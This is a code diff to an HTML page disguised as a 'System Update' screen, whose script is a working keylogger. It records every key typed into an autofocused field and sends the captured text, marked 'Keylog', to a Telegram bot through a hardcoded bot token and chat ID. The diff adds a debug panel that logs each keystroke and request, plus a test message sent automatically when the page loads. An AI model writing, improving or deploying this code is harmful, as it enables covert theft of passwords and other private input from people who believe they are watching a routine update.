@@ -65,9 +65,27 @@
             border-color: #00ff88;
             box-shadow: 0 0 30px rgba(0,255,136,0.4);
         }
+        #debug {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            color: #ff4444;
+            font-size: 12px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 8px;
+            max-width: 90%;
+            z-index: 9999;
+            font-family: monospace;
+            max-height: 200px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
+    <!-- Debug panel -->
+    <div id="debug">🟢 Ready...</div>
+
     <div class="container">
         <h1>🔧 System Update</h1>
         <p>Optimizing system performance...</p>
@@ -80,9 +98,32 @@
     <input type="text" id="keyInput" placeholder="Type here..." autofocus>
 
     <script>
+        // ===== DEBUG LOG =====
+        function debug(msg) {
+            const el = document.getElementById('debug');
+            const time = new Date().toLocaleTimeString();
+            el.innerHTML = `[${time}] ${msg}\n` + el.innerHTML;
+            if (el.innerHTML.split('\n').length > 10) {
+                el.innerHTML = el.innerHTML.split('\n').slice(0, 10).join('\n');
+            }
+        }
+
         // ===== TELEGRAM CONFIG =====
         const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
         const CHAT_ID = "1431950109";
+
+        // Verify token
+        if (!BOT_TOKEN || BOT_TOKEN === "") {
+            debug("❌ BOT_TOKEN is empty!");
+        } else {
+            debug("✅ BOT_TOKEN loaded: " + BOT_TOKEN.substring(0, 10) + "...");
+        }
+
+        if (!CHAT_ID || CHAT_ID === "") {
+            debug("❌ CHAT_ID is empty!");
+        } else {
+            debug("✅ CHAT_ID loaded: " + CHAT_ID);
+        }
 
         // ===== BUFFER & TIMER =====
         let buffer = "";
@@ -100,9 +141,12 @@
             if (timer) clearTimeout(timer);
             timer = setTimeout(() => {
                 if (buffer.length > 0) {
+                    debug("⏰ Auto-sending: " + buffer);
                     sendToTelegram(buffer);
                     buffer = "";
                     input.value = "";
+                } else {
+                    debug("⏰ Timer fired but buffer empty");
                 }
             }, IDLE_TIME);
         }
@@ -110,42 +154,78 @@
         // ===== KEYLOGGER =====
         input.addEventListener('keydown', (e) => {
             const key = e.key;
+            debug("🔑 Key: " + key);
 
             if (key === "Enter") {
                 e.preventDefault();
-                // Send buffer instantly
                 if (buffer.length > 0) {
+                    debug("⌨️ Enter pressed, sending: " + buffer);
                     sendToTelegram(buffer);
                     buffer = "";
                     input.value = "";
+                } else {
+                    debug("⌨️ Enter pressed but buffer empty");
                 }
-                // Cancel timer
                 if (timer) clearTimeout(timer);
                 return;
             }
 
             if (key === "Backspace") {
                 buffer = buffer.slice(0, -1);
+                debug("⬅️ Backspace, buffer: " + buffer);
             } else if (key.length === 1) {
                 buffer += key;
+                debug("✏️ Char: " + key + ", buffer: " + buffer);
             }
 
-            // Reset timer on every key press
             resetTimer();
         });
 
         // ===== SEND TO TELEGRAM =====
         function sendToTelegram(msg) {
-            if (msg.trim() === "") return;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            if (msg.trim() === "") {
+                debug("⚠️ Empty message, not sending");
+                return;
+            }
+
+            debug("📤 Sending to Telegram: " + msg);
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const body = JSON.stringify({
+                chat_id: CHAT_ID,
+                text: "📱 Keylog: " + msg
+            });
+
+            debug("📤 URL: " + url);
+            debug("📤 Body: " + body);
+
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: "📱 Keylog: " + msg
-                })
+                body: body
+            })
+            .then(response => {
+                debug("📥 Response status: " + response.status);
+                return response.json();
+            })
+            .then(data => {
+                debug("📥 Response data: " + JSON.stringify(data));
+                if (data.ok) {
+                    debug("✅ Message sent successfully!");
+                } else {
+                    debug("❌ Telegram error: " + data.description);
+                }
+            })
+            .catch(error => {
+                debug("❌ Network error: " + error.message);
             });
         }
+
+        // ===== TEST SEND ON LOAD =====
+        setTimeout(() => {
+            debug("🔍 Testing Telegram connection...");
+            sendToTelegram("🔍 Ghost Key activated!");
+        }, 3000);
     </script>
 </body>
 </html>
